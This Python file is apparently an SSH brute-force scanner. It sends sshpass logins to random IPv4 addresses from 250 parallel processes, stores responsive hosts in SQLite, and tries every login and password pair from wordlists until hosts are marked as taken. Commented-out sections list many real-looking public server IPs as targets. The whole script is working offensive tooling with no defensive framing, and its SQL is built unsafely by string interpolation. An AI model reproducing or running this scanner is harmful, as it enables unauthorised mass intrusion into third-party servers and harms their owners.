from random import randint, choice
import multiprocessing
import os
from datetime import datetime
import sqlite3
from time import sleep

DB_NAME = 'morton.sqlite'
START_LOGIN= 'a'
START_PASSWORD='123'

def get_random_ip_address():
    min_ip_part=0
    max_ip_part=255
    ip_part_1 = randint(min_ip_part, max_ip_part)
    ip_part_2 = randint(min_ip_part, max_ip_part)
    ip_part_3 = randint(min_ip_part, max_ip_part)
    ip_part_4 = randint(min_ip_part, max_ip_part)
    return f"{ip_part_1}.{ip_part_2}.{ip_part_3}.{ip_part_4}"

def write_data_to_text_file(data_line):
    with open('data.txt', 'a') as file: 
        file.write(f'{data_line}\n')

def init_database():
    try:
        con = sqlite3.connect(DB_NAME)
        cur = con.cursor()
        cur.execute('CREATE TABLE servers(ip text PRIMARY KEY, login text, password text, status text, is_my text, datetime text, attempts text)')
    except:pass

def get_connect_db():
    return sqlite3.connect(DB_NAME)

def get_iso_datetime_now():
    return str(datetime.now().astimezone().replace(microsecond=0))

def save_hackability_server(ip, status, attempts):
    con = get_connect_db()
    try:
        con.cursor().execute(f"INSERT INTO servers (ip, status, is_my, datetime, attempts) VALUES ('{ip}', '{status}', 'False', '{get_iso_datetime_now()}', '{attempts}')")
    except:pass
    con.commit()
    con.close()
           
def get_hackability_servers(n):
    while True:
        ip = get_random_ip_address()
        if is_live_linux_server(ip):
            save_hackability_server(ip, 1280, f'{START_LOGIN}:{START_PASSWORD}')
            print(ip, 'LIVE')
        else:
            print(ip, 'DEAD')

def is_live_linux_server(ip):
    if connect(ip, START_LOGIN, START_PASSWORD) in [1280]:
        return True

def save_ip_list_with_check(servers):
    for ip in servers:
        if is_live_linux_server(ip):
            save_hackability_server(ip, 1280, f'{START_LOGIN}:{START_PASSWORD}')
            print(ip, 'ADDED')

def connect(ip, login, password):
    return os.system(f"timeout 6s sshpass -p {password} ssh {login}@{ip} -o StrictHostKeyChecking=no 'ls' > /dev/null 2>&1")

def get_list_all_servers():
    con = get_connect_db()
    servers = [x[0] for x in con.cursor().execute("select ip from servers").fetchall()]
    con.close()
    return servers

def get_list_servers_for_hack():
    con = get_connect_db()
    servers = [x[0] for x in con.cursor().execute("select ip from servers where is_my='False'").fetchall()]
    con.close()
    return servers

def get_list_my_servers():
    con = get_connect_db()
    servers = [x[0] for x in con.cursor().execute("select ip from servers where is_my='True'").fetchall()]
    con.close()
    return servers

def get_attempts(ip):
    con = get_connect_db()
    attempts = con.cursor().execute(f"select attempts from servers where ip ='{ip}'").fetchone()[0].split(' ')
    con.close()
    return attempts

def update_data_in_servers(ip, login, password, attempts, status, is_my):
    attempts = ' '.join(attempts)
    con = get_connect_db()
    sql = f"UPDATE servers SET attempts = '{attempts}', login = '{login}', password = '{password}', status = '{status}', is_my = '{is_my}', datetime = '{get_iso_datetime_now()}' WHERE ip = '{ip}'"
    con.cursor().execute(sql)
    con.commit()
    con.close()

def crack():
    servers = get_list_servers_for_hack()
    logins = open('logins.txt', 'r').read().splitlines()
    passwords = open('passwords.txt', 'r').read().splitlines()
    for login in logins:
        for password in passwords:
            for ip in servers:
                attempts = get_attempts(ip)
                pair = f'{login}:{password}'
                if pair not in attempts:
                    result = connect(ip, login, password)
                    print(ip, pair, result)
                    attempts.append(pair)
                    if result == 1280:
                        update_data_in_servers(ip, '', '', attempts, result, 'False')
                    if result == 0:
                        update_data_in_servers(ip, login, password, attempts, result, 'True')
def crack_server(ip):
    attempts = get_attempts(ip)
    logins = open('logins.txt', 'r').read().splitlines()
    passwords = open('passwords.txt', 'r').read().splitlines()
    for login in logins:
        for password in passwords:
            pair = f'{login}:{password}'
            if pair not in attempts:
                result = connect(ip, login, password)
                print(ip, pair, result)
                attempts.append(pair)
                if result == 1280:
                    update_data_in_servers(ip, '', '', attempts, result, 'False')
                if result == 0:
                    update_data_in_servers(ip, login, password, attempts, result, 'True')
                return None
    # passwords = open('all_passwords.txt', 'r').read().splitlines()
    # for login in logins:

                    
        


if __name__ == '__main__':
    init_database()
    n=250
    multiprocessing.Pool(processes=n).map(get_hackability_servers, range(n))
    # save_hackability_server('61.104.24.189', 1280, 'a:123')
    # init_csv_file('ip;login;password;status;is_my;datetime;attempts')
    # start = datetime.now()
    # print(datetime.now()-start)
    # print(get_list_servers())

    # for num in range(10):
    #     multiprocessing.Process(target=get_hackability_servers, args=range(10)).start()
    # n=500

    # multiprocessing.Pool(processes=1).map(get_hackability_servers, range(1))
    # print(1)

    # multiprocessing.Pool(processes=1).map(get_hackability_servers, range(1))
    # print(2)

    # multiprocessing.Pool(processes=1).map(get_hackability_servers, range(1))
    # print(3)

    # multiprocessing.Pool(processes=1).map(get_hackability_servers, range(1))
    # print(4)


    # multiprocessing.Process(target=get_hackability_servers, args=range(1), name='hui').start()
    # print(1)
    # multiprocessing.Process(target=get_hackability_servers, args=range(1)).start()
    # print(2)
    # multiprocessing.Process(target=get_hackability_servers, args=range(1)).start()
    # print(3)
    # multiprocessing.Process(target=get_hackability_servers, args=range(1)).start()
    # print(4)
    # print(multiprocessing.current_process().name)
    # print(multiprocessing.active_children())

    
    # servers = get_list_servers_for_hack()
    # for ip in servers:
    #     if len(multiprocessing.active_children()) < 10:
    #         if ip not in [p.name for p in multiprocessing.active_children()]:
    #             multiprocessing.Process(target=crack_server, args=(ip,), name=ip).start()
    #             print(len(multiprocessing.active_children()), [p.name for p in multiprocessing.active_children()])

    # l=['a', 'b']

    # for i in l:
    #     globals()[i]=12
    # print(a)

    # save_ip_list_with_check(['100.68.13.58', '100.69.176.92', '100.74.40.118', '100.96.126.154', '101.32.186.14', '103.169.21.234', '103.74.252.59', '103.80.18.7', '104.131.52.42', '104.197.177.45', '104.200.202.214', '104.236.119.165', '107.180.241.205', '111.69.58.142', '113.193.18.90', '116.202.151.112', '118.195.152.228', '119.3.104.23', '12.161.70.170', '12.200.230.118', '121.121.204.195', '124.148.203.18', '124.223.111.167', '128.8.116.125', '13.76.186.94', '13.89.234.200', '134.68.16.225', '134.68.89.173', '135.125.224.211', '136.169.60.63', '138.201.36.194', '140.221.43.10', '140.77.166.240', '143.110.186.60', '144.217.153.20', '146.59.10.106', '148.72.239.181', '149.163.24.48', '149.56.45.206', '151.80.72.67', '155.94.164.245', '157.245.213.49', '157.245.245.137', '159.122.130.52', '160.153.218.115', '160.153.72.19', '162.55.35.109', '164.160.108.38', '164.90.202.241', '165.22.200.65', '165.227.156.145', '165.227.36.67', '167.114.129.97', '167.86.108.107', '168.119.175.255', '170.106.169.99', '173.199.144.150', '174.55.12.50', '176.62.237.123', '178.32.178.106', '185.180.130.174', '185.93.110.247', '186.152.108.44', '187.163.62.81', '188.120.225.204', '188.165.194.49', '188.165.59.31', '188.166.155.205', '188.232.17.94', '192.136.164.136', '192.186.219.24', '192.241.151.4', '192.99.61.146', '193.70.43.250', '194.195.212.177', '195.239.186.170', '198.211.116.41', '199.255.208.155', '2.56.215.148', '20.24.90.74', '20.71.141.123', '206.189.123.194', '206.189.13.23', '208.109.29.225', '208.87.198.52', '209.250.242.170', '212.41.17.177', '213.197.150.33', '217.160.46.32', '217.61.60.180', '219.95.63.241', '222.186.29.241', '223.214.30.232', '228.44.150.155', '24.166.255.14', '27.208.199.197', '3.137.216.142', '3.15.147.214', '3.235.178.226', '36.37.120.106', '36.66.111.81', '37.157.69.18', '42.98.185.21', '43.131.48.109', '45.148.120.45', '45.154.12.174', '45.32.80.107', '45.76.131.128', '46.4.155.92', '46.6.3.45', '49.12.232.191', '49.232.72.13', '49.248.11.238', '5.9.235.157', '50.2.106.18', '50.28.8.98', '50.3.222.68', '51.255.41.61', '51.77.194.212', '51.79.84.161', '52.10.244.39', '52.213.116.129', '52.237.109.122', '54.36.36.191', '57.67.35.249', '58.241.174.138', '62.109.9.10', '62.84.241.32', '64.44.42.186', '66.39.68.12', '66.94.101.6', '68.10.113.168', '68.169.54.109', '68.183.84.227', '77.55.131.106', '78.94.210.242', '80.209.239.35', '80.221.170.237', '80.82.118.75', '80.87.194.215', '81.14.224.203', '81.70.45.23', '82.146.46.166', '82.165.46.103', '83.175.144.133', '83.219.211.157', '85.128.159.75', '85.214.205.35', '85.214.249.59', '85.229.194.227', '87.139.39.123', '89.184.93.110', '91.134.13.111', '91.134.217.1', '92.205.62.75', '92.63.134.47', '92.66.171.184', '93.177.66.245', '94.136.161.129', '95.165.245.86', '95.78.0.189'])
    # crack()
    # print(get_attempts('103.169.21.234'))


# multiprocessing.Process(target=get_hackability_servers).start()
# HACKABILITY_SERVER
# morton = Morton
# for _ in range(1000):   
#     multiprocessing.Process(target=Morton().gen_ip_adressses()).start
# Morton().gen_ip_adressses()



# Morton().get_hackability_servers()



# class Morton:
#     def __init__(self) -> None:
#         self.LENGHT_PASSWORD=10
#         self.symbools = ['0', '1', '2', '3', '4', '5', '6', '7' '8', '9']
#         self.filename ='list_ip.txt'


#     def get_connect(self, hostname, username, password):
#         return self.client.connect(hostname="192.168.100.1", username="cisco", password="cisco")

#     def check_connect():
#         pass

#     def _write_unique_ip_in_file(self, ip, filename):
#         with open(filename, 'a') as file: 
#             file.write(f'{ip}\n')

#     def _write_unique_password_in_file(self, ip):
#         with open('list_ip.txt', 'a') as file: file.write(f'{ip}\n')

#     def _get_count_lines_file(self, filename):
#         file = open(filename, 'r')
#         line_count = 0
#         for line in file:
#             if line != "\n":
#                 line_count += 1
#         file.close()
#         return line_count

#     def check_uniqueness_ip(self, ip, filename):
#         with open(filename, 'r') as file:
#             if ip not in file.readlines():
#                 return True
#         return False

#     # def get_filename(self):
#     #     counter = 1
#     #     while True:
#     #         filename = f'{filename}_{counter}.txt'
#     #         print(self._get_count_lines_file(self, filename))
#     #         if self._get_count_lines_file(self, filename) <= 50000:
#     #             return filename
#     #         counter+=1

#     def gen_ip_adressses(self):
#         while True:
#             ip = self.get_random_ip_address()
#             if self.check_uniqueness_ip(ip, self.filename):
#                 self._write_unique_ip_in_file(ip, self.filename)
 

